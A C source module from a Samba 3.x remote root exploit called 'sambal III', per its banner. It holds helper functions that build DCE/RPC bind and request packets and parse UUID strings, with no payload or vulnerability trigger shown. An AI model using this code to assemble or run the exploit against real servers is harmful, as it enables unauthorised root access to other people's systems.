/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "rpc.h"

void
RPC_build_bind_request(char *buffer, size_t length, struct rpc_uuid *uuid, struct rpc_uuid *syntax, unsigned int uuid_ver_major, unsigned int uuid_ver_minor)

{
        char *ptr = buffer;

        struct RPC_header       rpc_header;
        struct RPC_header_rb    rb_header;
        struct RPC_interface    interface;

        memset(&rpc_header,     '\0', sizeof(struct RPC_header));
        memset(&rb_header,      '\0', sizeof(struct RPC_header_rb));
        memset(buffer,          '\0', length);
        
        rpc_header.major        = RPC_MAJOR;
        rpc_header.minor        = RPC_MINOR;
        rpc_header.pkt_type     = RPC_BIND;
        rpc_header.flags        = 0x3;
        rpc_header.pack_type0   = 0x10;
        rpc_header.pack_type1   = 0;
        rpc_header.pack_type2   = 0;
        rpc_header.pack_type3   = 0;
        rpc_header.frag_len     = FRAG_LEN;
        rpc_header.auth_len     = 0;
        rpc_header.call_id      = DUMMY_VAL32;
        
        memcpy(ptr, &rpc_header, sizeof(struct RPC_header));

        ptr += sizeof(struct RPC_header);

        rb_header.max_tsize     = 0xffff;
        rb_header.max_rsize     = 0xffff;
        rb_header.assoc_gid     = 0;
        rb_header.num_contexts  = 1;

        memcpy(ptr, &rb_header, sizeof(struct RPC_header_rb));

        ptr += sizeof(struct RPC_header_rb);

        *(ptr + 2) = 1;                 // num_transfer_syntaxes

        ptr += 4;

        memcpy(&interface.interface_uuid, uuid, sizeof(struct rpc_uuid));

        interface.version_major         = uuid_ver_major;
        interface.version_minor         = uuid_ver_minor;

        memcpy(&interface.transfer_syntax, syntax, sizeof(struct rpc_uuid));
        
        interface.syntax_ver            = 2;

        memcpy(ptr, &interface, sizeof(struct RPC_interface));

        return;
}

size_t
RPC_build_request(char *buffer, size_t length, size_t frag_len, int opnum, char *rpc_data, size_t rpc_length)
{
        char *ptr = buffer;

        struct RPC_header       rpc_header;

        memset(&rpc_header,     '\0', sizeof(struct RPC_header));
        memset(buffer,          '\0', length);

        rpc_header.major        = RPC_MAJOR;
        rpc_header.minor        = RPC_MINOR;
        rpc_header.pkt_type     = RPC_REQUEST;
        rpc_header.flags        = 0x3;
        rpc_header.pack_type0   = 0x10;
        rpc_header.pack_type1   = 0;
        rpc_header.pack_type2   = 0;
        rpc_header.pack_type3   = 0;
        rpc_header.frag_len     = frag_len;
        rpc_header.auth_len     = 0;
        rpc_header.call_id      = DUMMY_VAL32;

        memcpy(ptr, &rpc_header, sizeof(struct RPC_header));

        ptr += sizeof(struct RPC_header) + 6;

        *(ptr) = opnum;

        ptr += 2;
        
        memcpy(ptr, rpc_data, rpc_length);

        return rpc_header.frag_len;
}

void
RPC_put_uuid(char *uuid_string, struct rpc_uuid *uuid)
{
        struct rpc_uuid2 uuid2;

        memset((void *)uuid,    '\0', sizeof(struct rpc_uuid));
        memset((void *)&uuid2,   '\0', sizeof(struct rpc_uuid2));

        if (sscanf(     (unsigned char *)uuid_string, 
                        "%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x", 
                        (unsigned int *)&uuid2.time_low,
                        (unsigned int *)&uuid2.time_mid,
                        (unsigned int *)&uuid2.time_hi,
                        (unsigned int *)&uuid2.clock_seq[0],
                        (unsigned int *)&uuid2.clock_seq[1],
                        (unsigned int *)&uuid2.node[0],
                        (unsigned int *)&uuid2.node[1],
                        (unsigned int *)&uuid2.node[2],
                        (unsigned int *)&uuid2.node[3],
                        (unsigned int *)&uuid2.node[4],
                        (unsigned int *)&uuid2.node[5]) != 11) {

                fprintf(stderr, "RPC_put_uuid: Invalid uuid string supplied!\r\n");
                exit(EXIT_FAILURE);
        }

        uuid->time_low          = uuid2.time_low;
        uuid->time_mid          = uuid2.time_mid;
        uuid->time_hi           = uuid2.time_hi;
        uuid->clock_seq[0]      = uuid2.clock_seq[0];
        uuid->clock_seq[1]      = uuid2.clock_seq[1];
        uuid->node[0]           = uuid2.node[0];
        uuid->node[1]           = uuid2.node[1];
        uuid->node[2]           = uuid2.node[2];
        uuid->node[3]           = uuid2.node[3];
        uuid->node[4]           = uuid2.node[4];
        uuid->node[5]           = uuid2.node[5];

        return;
}

void
RPC_build_interface_uuid(char *uuid_string, char *syntax_string, struct rpc_uuid *uuid, struct rpc_uuid *syntax)
{
        RPC_put_uuid(syntax_string,  syntax);
        RPC_put_uuid(uuid_string,    uuid);

        return;
}
